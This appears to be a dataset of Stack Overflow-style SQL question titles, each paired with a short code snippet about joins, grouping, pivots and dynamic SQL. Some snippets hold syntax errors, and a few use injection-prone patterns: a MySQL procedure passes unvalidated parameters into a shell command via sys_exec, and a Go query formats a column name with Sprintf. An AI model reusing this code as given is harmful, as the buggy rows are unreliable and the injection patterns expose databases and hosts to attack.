"
19427,25431,MySQL - Grouping and counting,"select a.placement_id, p.name as placement_name, count(l.status)
from actions a
inner join placements p on p.id = a.placement_id 
inner join leads l on l.id = a.lead_id 
group by a.placement_id, p.name
"
4653,4476,Minimum GRANTs needed by mysqldump for dumping a full schema? (TRIGGERs are missing!!),"GRANT USAGE ON *.* TO 'dump'@'%' IDENTIFIED BY ...;
GRANT SELECT, LOCK TABLES ON `mysql`.* TO 'dump'@'%';
GRANT SELECT, LOCK TABLES, SHOW VIEW, EVENT, TRIGGER ON `myschema`.* TO 'dump'@'%';
"
11123,34083,SQL table references,"code example
SELECT * FROM Person
JOIN Account ON (Person.ID = Account.owner)
WHERE Person.ID = XY;
"
16608,48103,Select badges from table only if all requirements rows exist,"SELECT badge_id
FROM  (  -- count missions per badge for the given user
   SELECT br.badge_id, count(*) AS ct
   FROM   finished_missions fm
   JOIN   badge_requirements br USING (mission_id)
   WHERE  fm.user_id = 221
   GROUP  BY  1
   ) u  -- count missions per badge total
JOIN (
   SELECT br.badge_id, count(*) AS ct
   FROM   badge_requirements
   ) b USING (badge_id, ct)  -- only badges with the full count of missions
"
30357,62457,SUM() all rows after current row,"select level, count, sum(count) over (order by level desc) as cumecount
from t;
"
27637,16255,Oracle : how to find occurrence of specified value in particular column of a table in oracle,"Select nvl(MAX(col),'NA')
from (select id, col from table
      where id = 1 
      union all 
      select 1 id, null from dual)
group by id
"
555,69505,Create a DATABASE using as a Name from a Variable,"-- Set Data Base name
DECLARE @DataBaseName sysname;
SET @DataBaseName = 'DbCmsWebsiteTest';

IF (@DataBaseName  LIKE '%[^0-9A-Z]%')
    RAISERROR('Invalid Characters in Name, %s',16,1,@DataBaseName)
ELSE
    BEGIN
    SET @DataBaseName = QUOTENAME(@DataBaseName)
    EXEC('CREATE DATABASE '+ @DataBaseName)
    END
"
31117,29710,"Doing an ""if"" type statement in a sql where clause","Select a.ItemID, b.ConversionFactor VCaseAmt, sum(c.ConversionFactor + 1) SCaseAmt, a.status, a.UserFld2

From timItem a inner join
    timItemUnitOfMeas b on a.ItemKey = b.ItemKey and b.TargetUnitMeasKey = 115 left join
    timItemUnitOfMeas c on a.ItemKey = c.ItemKey and c.TargetUnitMeasKey = 116 left join
    timItemUnitOfMeas d on a.ItemKey = d.ItemKey and d.TargetUnitMeasKey = 126

Where d.TargetUnitMeasKey is null and b.ConversionFactor != c.ConversionFactor + 1 and a.Status = 1 and 
not (a.itemid like 'd%' AND a.userfld2 = 'Container') 

Group by a.ItemID, b.TargetUnitMeasKey, b.ConversionFactor, C.TargetUnitMeasKey, c.ConversionFactor, a.status, a.UserFld2

Order by a.ItemID
"
9723,7223,SELECT MAX field value OR zero value,"SELECT case when min(abs(time)) = 0 then 0 else max(time) end FROM user_groups;
"
29833,46956,Permanently Set Postgresql Schema Path,"ALTER ROLE <your_login_role> SET search_path TO a,b,c;
"
7637,11142,Copy rows between databases in SQL server,"INSERT INTO target(field1, field2, field3)
SELECT field1, field2, field3 FROM source;
"
11321,3301,"IF, EXISTS and SELECT in one SQL query","    DECLARE var0 INT;

    SELECT COUNT(*) INTO var0 FROM table 
    WHERE WOLOLO IS NOT NULL and RED = '10'; 


    IF var0>0 THEN
     SELECT BLUE FROM table 
    END IF;

    IF var0=0 THEN
     INSERT INTO table ....
    END IF;    
"
37183,13062,Archiving large amounts of old data in SQL Server,"SELECT * INTO ANewArchiveTable
FROM CurrentTable
WHERE SomeDateColumn <= DATEADD(year, -2, GETDATE())
"
5554,47526,"SQL select rows based on newest date, with sum of older included?",";WITH x AS 
(
  SELECT CustNum, CustName, SalesMan, Address, 
    s = SUM(SoldTotal) OVER (PARTITION BY CustNum),
    r = ROW_NUMBER() OVER (PARTITION BY CustNum ORDER BY SaleDate DESC)
  FROM dbo.YourTable
)
SELECT CustNum, CustName, SalesMan, Address, SoldTotal = s
  FROM x
  WHERE r = 1;
"
27036,5479,MySQL show ranks of multiple columns,"SELECT Name,Height,Weight,FIND_IN_SET( Height,( SELECT GROUP_CONCAT( Height ORDER BY Height DESC ) FROM scores )) AS Height_Rank,FIND_IN_SET( Weight,( SELECT GROUP_CONCAT( Weight ORDER BY Weight DESC ) FROM scores ) ) AS Weight_Rank FROM scores
"
6174,2917,MySQL - combining multiple queries,"SELECT  a.id AS steam, 
        a.skills AS level,
        b.name
FROM    wcgousers a
        INNER JOIN warn_oldnames b
            ON a.ID = b.ID
        INNER JOIN
        (
            SELECT  ID, MAX(lasttime) max_date
            FROM    warn_oldnames
            GROUP   BY ID
        ) c ON  b.ID = c.ID AND
                b.lastTime = c.max_date
WHERE   a.race = '_wcs_'
-- ORDER  BY ABS(a.skills) DESC 
-- LIMIT  10
"
28640,51814,"How to show x,y,count(*) in 2-D by one SQL?","SELECT row,
SUM(CASE WHEN col= 'x1' THEN 1 else 0 END) AS x1,
SUM(CASE WHEN col= 'x2' THEN 1 else 0 END) AS x2,
SUM(CASE WHEN col= 'x3' THEN 1 else 0 END) AS x3
FROM data 
GROUP BY row;
"
12495,47188,How to select elements from a table referenced by another table?,"select * 
from resultsTable r
join parameterTable p on r.parameterKey = p.id
join fileTable f on r.fileKey = f.id
join fileType ft on ft.id = f.fileType
where ft.type = 'fileTypeA'
"
36014,50577,Laravel 4.2 open a second database connection to the main database,"$pdo = DB::connection('connection 2 name here')->getPdo();
"
26063,39879,Get max number from table add one and check with specific convention,"SELECT CASE WHEN r.number IS NULL THEN 1001
            WHEN r.number = 9999 THEN 10001
            ELSE r.number + 1 END number
FROM ( VALUES(12) ) AS a(category)
LEFT JOIN (
  SELECT PARSENAME(prodno, 3) category,
         MAX(CAST(PARSENAME(prodno, 2) AS INT)) number
  FROM products
  GROUP BY PARSENAME(prodno, 3)
) r
ON r.category = a.category;
"
5327,41056,How to combine resulting rows into a single row seperated by commas,"CREATE TABLE ConvertRowsToSingleCell
(
    sequence int
    ,tag varchar(max)
    ,associatedId varchar(max)
)

INSERT INTO ConvertRowsToSingleCell
VALUES 
    (1,'MA2D8111AM', 'MA2D811S')
    ,(2, 'MA2D8112AM', 'MA2D811S')
    ,(3, 'MA2D8113AM', 'MA2D811S')
    ,(4, 'MA2D8114AM', 'MA2D811S')

DECLARE @Length int = (Select COUNT(*) FROM ConvertRowsToSingleCell)
        ,@Increment int = 1
        ,@Item varchar(max)
        ,@ConcatenatedString varchar(max);

WHILE @Increment <= @Length
BEGIN

    IF (@Increment = @Length) --Remove comma at end
        BEGIN
            Select @Item = tag + ':' + associatedId from ConvertRowsToSingleCell
            where @Increment = sequence
        END
    ELSE
        BEGIN
            Select @Item = tag + ':' + associatedId + ', ' from ConvertRowsToSingleCell
            where @Increment = sequence
        END
    Set @ConcatenatedString = ISNULL(@ConcatenatedString,'') + @Item
    SET @Increment = @Increment + 1 
END

Select @ConcatenatedString
"
38473,62108,take top 3 count from two table SQLSERVER 2008,"SELECT TOP 3 dbo.Family.F_id
FROM dbo.Family 
INNER JOIN dbo.Family_member
ON dbo.Family.F_id = dbo.Family_member.FM_f_id
GROUP BY dbo.Family.F_id
ORDER BY count(*) DESC 
"
7715,40084,SQL multiple rows as columns with out using PL/SQL,"SELECT q_id, 
       q_text,
       (SELECT a_text
          FROM answers a1
         WHERE a1.q_id = q1.q_id
           AND (SELECT count(*) FROM answers a2 WHERE a1.q_id = a2.q_id AND a2.a_id < a1.a_id) = 0) as option1,
       (SELECT a_text
          FROM answers a1
         WHERE a1.q_id = q1.q_id
           AND (SELECT count(*) FROM answers a2 WHERE a1.q_id = a2.q_id AND a2.a_id < a1.a_id) = 1) as option2,
       (SELECT a_text
          FROM answers a1
         WHERE a1.q_id = q1.q_id
           AND (SELECT count(*) FROM answers a2 WHERE a1.q_id = a2.q_id AND a2.a_id < a1.a_id) = 2) as option3,
       (SELECT a_text 
          FROM answers a1
         WHERE a1.q_id = q1.q_id
           AND (SELECT count(*) FROM answers a2 WHERE a1.q_id = a2.q_id AND a2.a_id < a1.a_id) = 3) as option4,
       (SELECT a_text
          FROM answers a1
         WHERE a1.a_id = (select a_id from correct_answers c1 where c1.q_id = q1.q_id)) as correct
  FROM questions q1;
"
11083,41388,Get specific part of dynamic string in TSQL,"declare @src nvarchar(max), @Start_Position int, @End_Position int
select @src = 'AA=Item0,ZZ=Item1,ZZ=Item2,ZZ=Item3,ZZ=Item4,ZZ=Item5'

select @Start_Position = charindex('ZZ', @src, charindex('ZZ', @src) + 1) + 3
select @End_Position = charindex(',ZZ', @src, @Start_Position)

select substring(@src, @Start_Position, @End_Position - @Start_Position)
"
13989,24926,Query to ORDER BY the number of rows returned from another SELECT,"SELECT *
FORM   users u
LEFT   JOIN (
   SELECT user_id, count(*) AS friends
   FROM   friends
   ) f USING (user_id)
ORDER  BY f.friends DESC NULLS LAST, user_id -- as tiebreaker
"
33142,18437,"use of case when else in sql , not getting intended result","select ROW_NUMBER() OVER (ORDER BY QMID) AS SrNo,
       max(CASE Language WHEN 1 THEN Question end) as English,
       max(CASE Language WHEN 2 THEN Question end) as Spanish
from QuestionMaster
group by QMID
"
15081,18556,In MySQL How do I specify Collation for WHERE-IN clause?,"WHERE email_address IN ('foo@bar.com' COLLATE utf8_general_ci, 'test@test.com' COLLATE utf8_general_ci)
"
38025,42563,show balance stock,"declare @tb table (itemCode varchar(10),DateofReceipt date,invno varchar(10), inqty int)
    insert into @tb (itemcode,dateofReceipt,invno,inqty) values
    ('A00001','20150401','Inv01',100),
    ('A00001','20150410','Inv03',50),
    ('A00002','20150405','Inv02',100),
    ('A00002','20150415','Inv04',50)

    declare @stock table(item varchar(10),qty int)
    insert into @stock (item,qty) values
    ('A00001',50),('A00002',120)

    ;with cte as (select *,case when row_number() over(partition by itemCode order by DateofReceipt desc )=1 then qty else 0 end as stk,
    row_number() over(order by itemcode, DateofReceipt desc) as rno
    from @tb t inner join @stock s on t.itemCode=s.item),
    ct1 (stock,bls,rno) as (select case when stk<=inqty then stk else inqty end as stock,case when stk<=inqty then 0 else stk-inqty end as bls,rno from cte where rno=1
    union all select case when stk+bls<=inqty then stk+bls else inqty end as stock,case when stk+bls<=inqty then 0 else stk+bls-inqty end as bls,cte.rno from ct1 inner join cte on ct1.rno+1=cte.rno)

    select itemcode,dateofReceipt,invno,inqty,stock from ct1 inner join cte on ct1.rno =cte.rno
"
32102,63956,NOT IN clause and NULL value,"WHERE NAME NOT IN ('C') OR NAME IS NULL
"
38831,9849,Select numbers not present in multiple number series in Oracle,"select sequence_number from myvalues m
where not exists
 ( select 1 from myseries s where m.sequence_number between s.start_sequence
   and s.end_sequence )
"
38789,65209,Android: Fetching values from arraylist of map," String[] stockArr = new String[map_all_info_photoarraylist.size()];
          for(int i =0; i<map_all_info_photoarraylist.size(); i++){
              stockArr[i] = map_all_info_photoarraylist.get(i).get_photo_ref();
           }
"
17192,7379,SQL subqueries coding style,"select t4.foo
from table2 t1
join table2 t2 on t2.idparent = t1.idchild
join table2 t3 on t3.idparent = t2.idchild
join table t4 on t4.foo_id = t3.idchild and t4.txt_type ='some_cat'
where t1.idparent = @id
"
34955,4416,Surround Variable with Single Quotes when Passing SQL Smalldatetime,"DECLARE @return_value int
    ,@TaskID int
    ,@CompletedDate smalldatetime
SET @TaskID = 90
SET @CompletedDate = '2010-01-20 15:28:00'

EXEC    @return_value = [dbo].[usp_Task_Completion]
        @TaskID = @TaskID,
        @CompletedDate = @CompletedDate
"
20210,68048,filling one table column with if else statement in SQL,"SELECT p.Name,
    CASE WHEN X.ProductID IS NULL THEN 'NO' ELSE 'YES' END AS InTopTen
FROM Production.Product p
LEFT JOIN
(
     SELECT TOP 10 ProductID FROM Sales.SalesOrderDetail
     GROUP BY ProductID 
     ORDER BY COUNT(*) DESC
) X
ON X.ProductID = p.ProductID
"
31877,61869,sql - How to select so that the row can be column?,"select * 
from YourTable src
pivot (max(name) for name_location in ([london], [beijing]) ) p
"
7694,7645,SQL left Join with no matches in where,"SELECT ITEM.ID, DAT1.DATE, DAT2.DATE, DAT3.DATE
FROM ITEM 
LEFT JOIN DATES AS DAT1 ON DAT1.ITEM_ID = ITEM.ID AND DAT1.FUNCTCODE ='START'
LEFT JOIN DATES AS DAT2 ON DAT2.ITEM_ID = ITEM.ID AND DAT2.FUNCTCODE ='END'
LEFT JOIN DATES AS DAT3 ON DAT3.ITEM_ID = ITEM.ID AND  DAT3.FUNCTCODE ='REFURBISHED'
WHERE ITEM.ID > 2000;
"
29865,14398,Oracle Text Search on certain columns,"CONTAINS(indexme,'jack INPATH(/HELPER/EMP_NAME) and jill INPATH(/HELPER/SUPERVISOR)') > 0;
"
32559,62860,How to understand what I need to do in a query,"SELECT name,continent,population FROM world x
  WHERE 25000000 >= ALL (
    SELECT population FROM world y
     WHERE x.continent=y.continent
       AND y.population>0)
"
26621,23141,SQL Server equivalent of PostgreSQL distinct on (),";WITH CTE AS
(
    SELECT *, ROW_NUMBER() OVER(PARTITION BY a ORDER BY b) Corr
    FROM my_table
)
SELECT *
FROM CTE
WHERE Corr = 1
"
14991,26419,Paradox DB SQL Multiple JOINS,"FROM 
    (
        ""CHECK"" C
        INNER JOIN 
        ""RCHECK"" R
            ON C.Cnum = R.Cnum 
    )
    INNER JOIN 
    ""PCHECK"" P
        ON P.Cnum = C.Cnum 
"
9862,58858,Compare Oracle table columns in SQL,"SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='A' AND OWNER='YourSchema'
minus
SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='B' AND OWNER='YourSchema'
"
1579,44749,Mongodb - Database hits,"db.pages.update({page: ""index""}, {$inc: {hits: 1}})
"
3132,12411,SQL get latest record for each ID,"select u.id, u.name, s.saldo, p.last_paid_date, p2.amount
  from users u
  join saldo s
    on u.id = s.user_id
  join (select user_id, max(paid_date) as last_paid_date
          from payments
         group by user_id) p
    on u.id = p.user_id
  join payments p2
    on p.last_paid_date = p2.paid_date
   and p.user_id = p2.user_id
"
33089,38582,how to create triggers in sqlite3?,"CREATE TABLE child(
  id         INTEGER,
  some_info  TEXT, 
  master_id  INTEGER,
  FOREIGN KEY(master_id) REFERENCES master(id) ON DELETE CASCADE
);
"
18694,29680,SQL query to retrieve SUM in various DATE ranges,"SELECT SUM(totalprice), year(date), month(date) from sales
group by year(date), month(date)
"
7111,74017,Select using LEFT OUTER JOIN with condition,"SELECT A.id,
       A.name,
       B.[datetime]
FROM   tableA A
       LEFT OUTER JOIN tableB B
                    ON A.Id = B.id
                       AND B.[datetime] < @date 
"
3165,13337,Update using GROUP by,"update 
SalesQuotesTest.dbo.Quote 
set CurrentQuote = 1
where OriginalQuoteID in ( select OriginalQuoteID 
                           from SalesQuotesTest.dbo.Quote 
                           group by OriginalQuoteID
                           having COUNT(*) < 2
                          )
"
32958,17102,Oracle equivalent for SQL Server INSERTED and DELETED tables,"create or replace PROCEDURE CreateTrackingTriggers
(
-- take the target table and shadow user as agruments
v_TableName IN NVARCHAR2 DEFAULT NULL,
v_ShadowUser IN NVARCHAR2 DEFAULT 'SHADOW_USER' 
)
AUTHID CURRENT_USER -- grant permission to create triggers
AS
v_TriggerName NVARCHAR2(500);
v_ColList NVARCHAR2(2000);
v_ColList_shadow NVARCHAR2(2000);
v_SQLCommand VARCHAR2(4000);
v_ColName NVARCHAR2(500);
v_ColSize NUMBER(10,0);
v_Prefix NVARCHAR2(500);
v_count  NUMBER(1,0);

BEGIN

DECLARE
  -- define a cursor to get the columns of the target table. order by COLUMN_ID is important
  CURSOR Cols
  IS SELECT COLUMN_NAME , CHAR_COL_DECL_LENGTH  FROM USER_TAB_COLS
  WHERE TABLE_NAME =  upper(v_TableName) order by COLUMN_ID;
  -- define a cursor to get the columns of the target shadow table order by COLUMN_ID is important
  CURSOR Shadow_Cols
  IS SELECT COLUMN_NAME , CHAR_COL_DECL_LENGTH  FROM ALL_TAB_COLS
  WHERE TABLE_NAME =  upper(v_TableName) and upper(owner)=upper(v_ShadowUser) order by COLUMN_ID;

BEGIN
  -- generate the trigger name for target table
  v_TriggerName := 'TRG_' || upper(v_TableName) || '_Track' ;

  -- check v_count , determine whether shdow table exist if not handle it
  select count(*) into v_count from all_tables where table_name = upper(v_TableName) and owner = upper(v_ShadowUser);

 -- iterate the cursor. generating column names prefixing  ':new.'

  OPEN Cols;
  FETCH Cols INTO v_ColName,v_ColSize;
 WHILE Cols%FOUND 
  LOOP 

     BEGIN
           IF v_ColList IS NULL THEN
             v_ColList :=  ':new.'||v_ColName ;
           ELSE
             v_ColList := v_ColList || ',' || ':new.'||v_ColName;
           END IF;

        FETCH Cols INTO v_ColName,v_ColSize;
     END;
  END LOOP;

  CLOSE Cols;

  -- iterate the cursor. get the shadow table columns

  OPEN Shadow_Cols;
  FETCH Shadow_Cols INTO v_ColName,v_ColSize;

 WHILE Shadow_Cols%FOUND 
  LOOP 

     BEGIN

           IF v_ColList_shadow IS NULL THEN
             v_ColList_shadow := v_ColName;
           ELSE
             v_ColList_shadow := v_ColList_shadow || ',' || v_ColName;
           END IF;

        FETCH Shadow_Cols INTO v_ColName,v_ColSize;
     END;
  END LOOP;

  CLOSE Shadow_Cols;

-- create trigger command. This will generate the trigger that dupilicates target   table's data into shdow table
v_SQLCommand := 'CREATE or REPLACE TRIGGER '||v_TriggerName||'
AFTER INSERT OR UPDATE OR DELETE ON '||upper(v_TableName)||'
REFERENCING OLD AS old NEW AS new 
FOR EACH ROW

DECLARE    
  ErrorCode NUMBER(19,0);
BEGIN

 -- v_ColList_shadow : shdow table column list
 -- v_ColList : target table column list with :new prefixed 
 INSERT INTO '|| v_ShadowUser ||'.'||upper(v_TableName)||'('||v_ColList_shadow||') values    ('||v_ColList||');
 EXCEPTION
   WHEN OTHERS THEN ErrorCode := SQLCODE;
 END;';

 EXECUTE IMMEDIATE v_SQLCommand;
 END;
END;
"
26452,62086,how to achieve the start time of another variable as the end time of the variable coming before it?,"SELECT LAG(TimeEnd, 1) OVER (ORDER BY PhaseID) TimeStart
"
1667,24539,InterSystems cache - how to insert into a join table?,"Insert into MyApp.Parent_Children values (1,null,2,'fzj')
"
17794,22945,Query using a SQL reference table,"SELECT dt.ID,dt.Title,dt.description,
       L1.Description as LocationDescription,
       L2.Description as CategoryDescription  ...

FROM data dt
JOIN Reference L1 on dt.location=L1.Reference and L1.ID=='LO'
JOIN Reference L2 on dt.category=L2.Reference and L2.ID=='CA'
"
36116,67317,Adding a inner join to this query,"SELECT l.id, 
(SELECT amount FROM lead_status WHERE lead_id = l.id AND buyer = 'BUYER_PROXY') AS our_bid,
(SELECT amount FROM lead_status WHERE lead_id = l.id AND buyer != 'BUYER_PROXY' AND discriminator='AUTO_PING' ORDER BY amount DESC LIMIT 1) AS best_bid,
(SELECT amount FROM lead_status WHERE lead_id = l.id AND discriminator = 'AUTO_POST' AND winner = 1 ORDER BY amount DESC LIMIT 1) AS final_sold_amount,
(SELECT buyer FROM lead_status WHERE lead_id = l.id AND discriminator = 'AUTO_POST' AND winner = 1 ORDER BY amount DESC LIMIT 1) AS buyer,
c.email
FROM leads AS l
INNER JOIN contacts AS c ON l.id = c.lead_id
WHERE l.state = 'ACCEPTED'
AND (SELECT buyer FROM lead_status WHERE lead_id = l.id AND discriminator = 'AUTO_POST' AND winner = 1 ORDER BY amount DESC LIMIT 1) != 'TEST'
AND DATE(l.create_date) > '2011-12-01'
"
26547,46968,SQL Server with RegExp,"where cast(right(data, 8) as date) = cast(getdate() as date)
"
1601,73434,SELECT multiple Records - MySQL,"SELECT T.*
  FROM (SELECT g.4digits, c.company_name, os.*,
               CASE 
                 WHEN @gistype != g.4digits THEN @rownum := 1 
                 ELSE @rownum := @rownum + 1 
               END AS seq,
               @gistype := g.4digits AS var_gistype
          FROM overall_scores os 
          JOIN company c
          ON c.company_id = os.company_id
          JOIN gics g
          ON g.company_id = c.company_id
          AND g.4digits in ((2550), (4010), (2540))
          AND os.overall_score <> 'NA'
          AND os.overall_score <> 'NaN'
          JOIN (SELECT @rownum := NULL, @gistype := '') r
      ORDER BY g.4digits, os.overall_score asc) T
 WHERE T.seq <= 5
"
26538,29878,Adding values from two table and storing into third table,"INSERT INTO Table1 (Amount, ContactName, State, City) 
values 
(
    (Select nvl(max(Amount),0) from Table2 where id=12)+
    (Select nvl(max(Amount),0) from Table3 where id=13),
    'Sam','Newyork','Newyork'
);
"
15680,46025,SQL Server (T-SQL) Insert if Don't Exist,"INSERT INTO dbo.tblBootStrapperInstruments (CCY, Instrument, Tenor) 
SELECT mx.CCY,mx.Instrument,mx.Gridpoint FROM dbo.Feed_Murex_Intraday_DF mx
LEFT OUTER JOIN dbo.tblBootStrapperInstruments bs 
ON bs.CCY = mx.CCY 
AND bs.Instrument = mx.Instrument 
AND bs.Tenor = mx.Gridpoint
WHERE bs.CCY IS NULL
"
2835,13867,Get the associated name of two database columns of the same type,"SELECT dep.name AS departure_airport, arr.name AS arrival_airport 
FROM flights f
    JOIN airports dep ON f.departure_airport_id = dep.id 
    JOIN airports arr ON f.arrival_airport_id = arr.id
"
14122,43788,"SQL,multiple counts with multiple results","AND TO_DATE(ti.DEPARTURE_DATE,'YYYYMM') = TO_DATE(to.DEPARTURE_DATE,'YYYYMM')

SELECT TO_DATE(TRAIN.DEPARTURE_DATE,'YYYYMM')
  , (select COUNT(DISTINCT DEPARTURE_DATE) 
     FROM TRAIN ti
     WHERE PERSON_ID='28' AND DEPARTURE_STATION = 'DUBLIN' AND TO_DATE(ti.DEPARTURE_DATE,'YYYYMM') = TO_DATE(to.DEPARTURE_DATE,'YYYYMM')) AS Mark
  , (select COUNT(DISTINCT DEPARTURE_DATE) 
     FROM TRAIN 
     WHERE PERSON_ID='29' AND DEPARTURE_STATION = 'DUBLIN' AND TO_DATE(ti.DEPARTURE_DATE,'YYYYMM') = TO_DATE(to.DEPARTURE_DATE,'YYYYMM')) AS Chris 
FROM TRAIN to
GROUP BY DEPARTURE_DATE
"
34305,62428,How can I use a parameterized query to search on a column by its name?,"db.Query(fmt.Sprintf(""SELECT * FROM mytable WHERE %s = ?"", col), searchStr)
"
10211,27492,Oracle function to distinct NULL values based on other column,"SELECT column1, column2 
  FROM dummy t1
 WHERE column2 IS NOT NULL 
       OR NOT EXISTS (SELECT '' 
                        FROM dummy t2 
                       WHERE t1.column1 = t2.column1 
                         AND column2 IS NOT NULL)
"
15668,43152,How to get Sql Server XML variable into TEXT column,"declare @xml xml

declare @tblTest table (
    Id int,
    XMLColumn text
)

insert into @tblTest
    (Id, XMLColumn)
    values
    (1, '<MyTest><TestNode>A</TestNode></MyTest>')

set @xml =  '<MyTest><TestNode>A</TestNode><TestNode>B</TestNode></MyTest>'

update @tblTest
    set XMLColumn = cast(@xml as varchar(max))
    where Id = 1

select Id, XMLColumn from @tblTest
"
35274,67917,What would a Database Diagram (ER Diagram/Table Layout) look like for measuring distribution of something?,"LOGID (PK)  ACTIVITYID  SOURCE  DATELOGGED
----------  ----------  ------  ----------
"
10628,45385,SQL Query- Not able to compare fields values?,"WHERE DATE(played_dt) = '2009-06-16'
"
9995,22338,MySQL join of 3 tables - get aggregate value from 2 child tables,"SELECT u.userId, COUNT(DISTINCT table1.webId), COUNT(DISTINCT table2.webId)
FROM `user` u 
LEFT JOIN `table1` t1
    ON u.userId = t1.userId
LEFT JOIN `table2` t2
    ON u.userId = t2.userId
GROUP BY u.userId
"
10779,11158,SELECT chaining the result of two queries on MYSQL,"SELECT a.x AS x, a.y AS y FROM a
UNION ALL
SELECT b.x AS x, b.y AS y FROM b
"
4677,61090,Return SUM of all columns in a row dynamically,"USE mydatabase
DECLARE 
    @table varchar(max) = 'myTable',
    @exec nvarchar(max);

select
    @exec = 'select SUM('+RIGHT(c,LEN(c)-1)+') from '+@table
from (
    select
        '+'+c.name 
    from sys.columns c
    inner join sys.tables t on
        c.object_id = t.object_id
    inner join sys.types ty on
        c.user_type_id = ty.user_type_id
    where
        ty.name in ('int') and
        t.name = PARSENAME(@table,1)
    FOR XML PATH('')
) T (c)
print @exec
exec sp_executesql @exec
"
14300,32780,SQL: How to find the minimum number of entries linked from one table to another,"WITH link_counts AS (
         SELECT a_id, COUNT(b_id) as num_links
           FROM table_c
       GROUP BY a_id
     )
SELECT a_id
  FROM link_counts
 WHERE num_links <= (SELECT MIN(num_links) FROM link_counts)
"
34688,63151,How do I count total of value in one column with different data,"select  UserGroup
,       count(case when UserStatus = 1 then 1 end) as Status_1
,       count(case when UserStatus = 2 then 1 end) as Status_2
,       count(case when UserStatus = 3 then 1 end) as Status_3
,       count(case when UserStatus = 4 then 1 end) as Status_4
from    table_group
group by
        UserGroup
"
11857,21014,"Joining Two Tables, but how to show all results?","SELECT e.*,w.* 
FROM episodes e 
LEFT JOIN watchlist w 
   ON e.episode_id=w.watchlist_series_episode_id AND w.watchlist_user_id='1'
WHERE e.episode_series_id='1' 
AND e.episode_series_season='1' 
"
32568,46607,MySQL Get result of loading data from file,"DELIMITER $$

DROP PROCEDURE IF EXISTS load_data$$

CREATE PROCEDURE load_data(pfile VARCHAR(100), pdbtable VARCHAR(100))
BEGIN
    DECLARE exec_str VARCHAR(500);
    DECLARE ret_val INT;
    IF (check_10m_file() = 'file ok') THEN
        SET exec_str := CONCAT('sh /server/loadpath/load.sh ', pfile, ' ', pdbtable);
        SET ret_val := sys_exec(exec_str);
        IF ret_val = 0 THEN
            SELECT 'OK' Result;
        ELSE
            SELECT 'ERROR' Result;
        END IF;
    END IF;
END$$

DELIMITER ;

CALL load_data('/server/filepath/file.csv', 'mydb.mytable');
"
15231,59238,Find any letter in a string SQL Server 2008 R2,"When [Page] like '[0-9][A-Z]' then left([Page],1)+((ASCII(convert(varchar,(RIGHT([Page],1))))-64)*.01) 
When [Page] like '[0-9][0-9][A-Z]' then left([Page],2)+((ASCII(convert(varchar,(RIGHT([Page],1))))-64)*.01) 
When [Page] like '[0-9][0-9][0-9][A-Z]' then left([Page],3)+((ASCII(convert(varchar,(RIGHT([Page],1))))-64)*.01) 
"
39393,25202,Building a SQL to calculate the number of rows relating to the parent,"SELECT Shop.name, COUNT(*) AS Num_Orders
FROM Shop JOIN `Order` ON Shop.id = `Order`.id
WHERE DATE(`Order`.`date`) = '2011-7-13'
GROUP BY `Order`.id;
"
18968,33611,Optimal Query for a problem,"SELECT news.*, votes.vote_type
FROM news 
LEFT OUTER JOIN votes 
ON votes.`hash` = news.`hash` 
AND votes.`user_id` = #
"
12540,11675,Would it be possible to combine these SQL select statements?,"Executing (default): (SELECT `id`, `name`, `private` FROM `Groups` WHERE`id` = '1' LIMIT 1)
                     UNION ALL
                     (SELECT `id`, `name`, `private` FROM `Groups` WHERE`id` = '2' LIMIT 1)
                     UNION ALL
                     (SELECT `id`, `name`, `private` FROM `Groups` WHERE`id` = '3' LIMIT 1)

Executing (default): SELECT count(*) 
                     FROM `Videos` 
                     WHERE `GroupId` IN ('1', '2', '3')  AND `live` = true

Executing (default): (SELECT `id`, `file` FROM `Videos` WHERE`GroupId` = '1' AND `live` = true ORDER BY `id` DESC LIMIT 20)
                     UNION ALL
                     (SELECT `id`, `file` FROM `Videos` WHERE`GroupId` = '2' AND `live` = true ORDER BY `id` DESC LIMIT 20)
                     UNION ALL
                     (SELECT `id`, `file` FROM `Videos` WHERE`GroupId` = '3' AND `live` = true ORDER BY `id` DESC LIMIT 20)
"
19234,58723,SQL Server Management Studio not showing correct data space of a table,"DBCC CLEANTABLE(0, N'dbo.YourTable');
"
19368,46594,SQL Get lowest level child and root node,"WITH r ( category_id, name, root, depth )
-- finds the root relationship
AS (
    SELECT category_id, name, category_id, 0
        FROM category
        -- WHERE parent IS NULL -- this would only look at root nodes
    UNION ALL
    SELECT c.category_id, c.name, r.root, r.depth + 1
        FROM r
        JOIN category c
            ON c.parent = r.category_id
), s ( category_id, name, root, window_id )
-- finds the lowest leaves
AS (
    SELECT category_id, name, root, RANK() OVER(partition by root order by depth DESC)
        FROM r
)
SELECT c.name AS NodeName, s.Name AS DeepLeafName
    FROM category c
    JOIN s
        ON c.category_id = s.root
        WHERE s.window_id = 1;
"
18678,41284,Most efficient way to query a database multiple times,"select distinct pa2.auth
from player_analytics pa join
     player_analytics pa2
     on pa.ip = pa2.ip and
        pa.auth = :auth and
        pa2.auth <> :auth;
"
16139,67923,historic 'slice' of table,"SELECT s1.ApplicantID, s1.SchoolID, s1.StatusID, s1.ChangeDate
FROM shadow s1
INNER JOIN
(
    SELECT ApplicantID, SchoolID, MAX(ChangeDate) AS maxDate
    FROM shadow
    GROUP BY ApplicantID, SchoolID
) s2
ON s1.ApplicantID = s2.ApplicantID AND s1.SchoolID = s2.SchoolID
    AND s1.ChangeDate = s2.maxDate
"
31771,50858,Using sql to find duplicate records and delete in same operation,"DELETE a FROM activities a 
   LEFT JOIN (SELECT MAX(id) AS id FROM activities GROUP BY name) uniqId 
   ON a.id=uniqId.id WHERE uniqId.id IS NULL;
"
28419,73134,Group By and add columns,"select ward,
       max(case when seqnum = 1 then councillor end) as councillor1,
       max(case when seqnum = 2 then councillor end) as councillor2,
       max(case when seqnum = 3 then councillor end) as councillor3
from (select wc.*,
             row_number() over (partition by ward order by councillor) as seqnum
      from ward_councillors wc
     ) wc
group by ward;
"
5808,41504,How to do a subquery against multiple phrases with LIKE or REGEXP?,"WHERE hashtag REGEXP (select GROUP_CONCAT(name SEPARATOR '|') from hashtags where hid = 1)
"
26827,42004,MS Access sum of related records,"SELECT VendorPartNumber, Sum(Quantity) as TotalAllocations
    FROM YourTable
    GROUP BY VendorPartNumber
"
5105,23333,How to get data for each month from current date sql query,"SELECT YEAR(CREATESTAMP), MONTH(CREATESTAMP) COUNT(R.REGID) AS TOTALCOUNT 
FROM REGISTRATION R
